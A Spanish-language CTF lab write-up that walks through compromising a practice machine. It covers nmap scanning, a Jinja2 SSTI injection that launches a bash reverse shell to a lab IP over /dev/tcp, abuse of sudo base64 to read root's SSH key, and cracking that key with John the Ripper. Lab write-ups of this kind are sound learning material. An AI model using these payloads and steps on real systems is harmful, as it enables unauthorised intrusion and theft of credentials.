# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c1763b0f-5d7f-44c1-a717-2723f62c30b2)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.2p1
2.  **80/tcp(HTTP):** Apache httpd 2.4.59
3. **8089/tcp(-)**: -
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a la página web de apache2 default.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/58823c23-3252-40ea-9587-a458f23d734a)

# Fase 2- Exploración

#### Unknow?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a972395b-a2b8-4953-bba0-e1184c2c7766)
Si vemos el resultado de escaneo de nmap nos dice que el puerto 8089 no sabe lo que es pero tiene GetRequest de http.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d7d4132d-d5d0-4aa4-8073-b3bef1e0ca73)

Y si vamos al buscador y ponemos la ip + puerto 8089, nos sale una pagina web.

#### Fuzzing

No encontramos nada.


# Fase 3- Explotación

#### 2 + 2¿?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8f3a5f3a-b70f-44cb-ae19-05644bc5c571)

Vamos a probar si es vulnerable a SSTI.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/500f4211-6be0-4aed-bcef-8583795ab032)

Y funciono, esta pagina web es vulnerable a SSTI.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ade2f9ea-9746-431e-9216-54e16aae7fc7)

Enviamos una reverse shell de `PayloadsAllTheThings` pero la modifique para que sea en vez de Python, bash ya que Python me daba problemas. El comando es:
```python
{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.17/443 0>&1"').read().zfill(417)}} {% endif %} {% endfor %}
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d2c851e5-9641-4199-b091-736215a6c142)

Y funciono, nos llego la reverse shell.

# Fase 4- Privilegios

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/25d01d6c-d22a-4cff-81d7-96a8d3b4b340)

Al hacer un sudo -l podemos ejecutar el binario base64 como usuario root.

#### Gtfobins
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/05263bf7-da5a-4cb9-850a-4a77900e7690)

Nos permite file read usando el comando: 
```python
sudo base64 "$LFILE" | base64 --decode
```
Donde "$LFILE" es el archivo que queremos leer.

#### id_rsa
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a1debd70-4473-4e69-a071-6cd200cc5fac)
Así que lo usamos para leer el id_rsa del usuario root

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e9d3925c-7e8b-4702-ba56-1721467f7ab0)

Si intentamos entrar, no podemos porque nos pide una password. Así que intentaremos crackear con Jhon. Lista de comandos:
```python
ssh2john id_rsa > hash

john hash --wordlist=/usr/share/wordlist/rockyou.txt
```
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f9801082-597e-4ea9-ba10-6415c87a1a69)

Y nos encuentra la contraseña `honda1` .

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7f412942-2c55-4143-98b5-4d282b38f456)

Y ya seriamos usuario root!



